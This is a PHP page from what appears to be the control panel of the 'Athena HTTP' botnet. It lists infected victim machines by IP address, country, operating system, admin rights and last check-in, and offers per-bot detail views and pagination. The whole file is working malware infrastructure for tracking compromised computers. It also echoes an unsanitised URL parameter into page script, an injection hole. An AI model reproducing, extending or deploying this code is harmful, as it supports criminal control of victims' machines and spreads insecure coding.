<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$PAGE_INCLUDE_BOTLIST = '';
	$PAGE_INCLUDE_PAGINATE = '';
	
	$SHOW_BOT_INFO = false;
	
	if($_GET['b'])
	{
		$result = mysql_query('SELECT * FROM botlist WHERE botid = \'' . mysql_real_escape_string(trim($_GET['b'])) . '\' LIMIT 1;');
		if(mysql_num_rows($result) == 1)
		{
			$row = mysql_fetch_array($result);
			
			$SHOW_BOT_INFO = true;
			
			$BOT_INFO_ID = htmlentities($row['botid']);
			$BOT_INFO_COUNTRY = htmlentities($row['country']);
			$BOT_INFO_IP = htmlentities($row['ip']);
			$BOT_INFO_OS = htmlentities($row['os']);
			$BOT_INFO_CPU = ($row['cpu'] == 1 ? '32 Bit' : '64 Bit');
			$BOT_INFO_TYPE = ($row['type'] == 1 ? 'Desktop' : 'Laptop');
			$BOT_INFO_CORES = htmlentities($row['cores']);
			$BOT_INFO_VER = htmlentities($row['version']);
			$BOT_INFO_NET = htmlentities($row['net']);
			$BOT_INFO_BOTS = htmlentities($row['botskilled']);
			$BOT_INFO_FILE = htmlentities($row['files']);
			$BOT_INFO_REG = htmlentities($row['regkey']);
			$BOT_INFO_ADMIN = ($row['admin'] == 1 ? 'Admin' : 'User');
			$BOT_INFO_RAM = htmlentities($row['ram'] . '%');
			$BOT_INFO_BUSY = ($row['busy'] == 1 ? 'Yes' : 'No');
			
		}
	}
	
	$botlist_page = is_numeric(trim($_GET['l'])) && isset($_GET['l']) ? trim($_GET['l']) : 0;
	$botlist_all = array();
	$botlist_count = 0;
		
	$results = array();	
	$results[] = mysql_query('SELECT botid, country, country_code, ip, os, cpu, type, cores, net, admin, ram, version, lastseen FROM botlist WHERE lastseen >= \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\' ORDER BY lastseen DESC;') or die(mysql_error());
	$results[] = mysql_query('SELECT botid, country, country_code, ip, os, cpu, type, cores, net, admin, ram, version, lastseen FROM botlist WHERE lastseen < \'' . mysql_real_escape_string($TIME - ONLINE - 30) . '\' AND lastseen >= \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\' ORDER BY lastseen DESC;') or die(mysql_error());
	$results[] = mysql_query('SELECT botid, country, country_code, ip, os, cpu, type, cores, net, admin, ram, version, lastseen FROM botlist WHERE lastseen < \'' . mysql_real_escape_string($TIME - DEAD - 30) . '\' ORDER BY lastseen DESC;') or die(mysql_error());
	
	for($i = 0; $i < 3; $i++)
	{
		if($i == 0) $bot_status = ' class="on">Online';
		if($i == 1) $bot_status = ' class="off">Offline';
		if($i == 2) $bot_status = '>Dead';
	
		while($row = mysql_fetch_array($results[$i]))
		{
			$botlist_current  = '					<tr>' . "\n";
			$botlist_current .= '						<td>' . htmlentities($row['botid']) . '</td>' . "\n";
			$botlist_current .= '						<td><img src="./img/flags/' . strtolower(htmlentities($row['country_code'])) . '.gif"></img> ' . htmlentities($row['country']) . '</td>' . "\n";
			$botlist_current .= '						<td>' . htmlentities($row['ip']) . '</td>' . "\n";
			$botlist_current .= '						<td>' . htmlentities($row['os']) . '</td>' . "\n";
			/*$botlist_current .= '						<td>' . ($row['cpu'] == 1 ? '32 Bit' : '64 Bit') . '</td>' . "\n";
			$botlist_current .= '						<td>' . htmlentities($row['cores']) . '</td>' . "\n";
			$botlist_current .= '						<td>' . ($row['type'] == 1 ? 'Desktop' : 'Laptop') . '</td>' . "\n";			
			$botlist_current .= '						<td>' . htmlentities($row['net']) . '</td>' . "\n";
			$botlist_current .= '						<td>' . ($row['admin'] == 1 ? 'Admin' : 'User') . '</td>' . "\n";*/
			$botlist_current .= '						<td>' . htmlentities($row['ram']) . '%</td>' . "\n";
			$botlist_current .= '						<td>' . htmlentities($row['version']) . '</td>' . "\n";
			$botlist_current .= '						<td>' . ($TIME - htmlentities($row['lastseen'])) . ' Seconds ago</td>' . "\n";
			$botlist_current .= '						<td' . $bot_status . '</td>' . "\n";
			$botlist_current .= '						<td><input onClick="navigateTo(\'./index.php?p=botlist' . (isset($_GET['l']) ? '&l=' . $_GET['l'] : '') . '&b=' . htmlentities($row['botid']) . '\');" type="button" class="paginate botlist" value="Info" /></td>' . "\n";
			$botlist_current .= '					</tr>' . "\n";
			
			$botlist_all[] = $botlist_current;
		}
	}
	
	$botlist_count = ceil(count($botlist_all) / 30);
	
	if($botlist_page > $botlist_count - 1) $botlist_page = $botlist_count - 1;
	if($botlist_page < 0) $botlist_page = 0;
		
	for($i = $botlist_page * 30; $i < ($botlist_page * 30) + 30; $i++) $PAGE_INCLUDE_BOTLIST .= $botlist_all[$i];
	
	$PAGE_INCLUDE_PAGINATE  = '				<span class="foot">' . "\n";
	$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_page > 0 ? ($botlist_page - 1) : '0') . '\');" type="button" class="paginate" value="Previous" />' . "\n";
	
	if($botlist_count > 5 && $botlist_page > 3 && $botlist_page < $botlist_count - 4)
	{
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=0\');" type="button" class="paginate" value="1" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					...' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_page - 2). '\');" type="button" class="paginate" value="' . ($botlist_page - 1). '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_page - 1). '\');" type="button" class="paginate" value="' . $botlist_page . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . $botlist_page . '\');" type="button" class="paginate selected" value="' . ($botlist_page + 1) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_page + 1) . '\');" type="button" class="paginate" value="' . ($botlist_page + 2) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_page + 2) . '\');" type="button" class="paginate" value="' . ($botlist_page + 3) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					...' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 1) . '\');" type="button" class="paginate" value="' . $botlist_count . '" />' . "\n";
	}
	else if($botlist_count > 5 && $botlist_page < 4)
	{
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=0\');" type="button" class="paginate' . ($botlist_page == 0 ? ' selected' : '') . '" value="1" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=1\');" type="button" class="paginate' . ($botlist_page == 1 ? ' selected' : '') . '" value="2" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=2\');" type="button" class="paginate' . ($botlist_page == 2 ? ' selected' : '') . '" value="3" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=3\');" type="button" class="paginate' . ($botlist_page == 3 ? ' selected' : '') . '" value="4" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=4\');" type="button" class="paginate' . ($botlist_page == 5 ? ' selected' : '') . '" value="5" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					...' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 1) . '\');" type="button" class="paginate" value="' . $botlist_count . '" />' . "\n";
	}
	else if($botlist_count > 5 && $botlist_page > $botlist_count - 5)
	{
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=0\');" type="button" class="paginate" value="1" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					...' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 5) . '\');" type="button" class="paginate' . ($botlist_page == $botlist_count - 5 ? ' selected' : '') . '" value="' . ($botlist_count - 4) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 4) . '\');" type="button" class="paginate' . ($botlist_page == $botlist_count - 4 ? ' selected' : '') . '" value="' . ($botlist_count - 3) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 3) . '\');" type="button" class="paginate' . ($botlist_page == $botlist_count - 3 ? ' selected' : '') . '" value="' . ($botlist_count - 2) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 2) . '\');" type="button" class="paginate' . ($botlist_page == $botlist_count - 2 ? ' selected' : '') . '" value="' . ($botlist_count - 1) . '" />' . "\n";
		$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_count - 1) . '\');" type="button" class="paginate' . ($botlist_page == $botlist_count - 1 ? ' selected' : '') . '" value="' . $botlist_count . '" />' . "\n";
	}
	else
	{	
		for($i = 0; $i < $botlist_count; $i++)
		{
			$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . $i . '\');" type="button" class="paginate' . ($botlist_page == $i ? ' selected' : '') . '" value="' . ($i + 1) . '" />' . "\n";
		}
	}
	
	$PAGE_INCLUDE_PAGINATE .= '					<input onClick="navigateTo(\'./index.php?p=botlist&l=' . ($botlist_page < $botlist_count - 1 ? $botlist_page + 1 : $botlist_count - 1) . '\');" type="button" class="paginate"value="Next" /> ' . "\n";
	$PAGE_INCLUDE_PAGINATE .= '				</span>' . "\n";
?>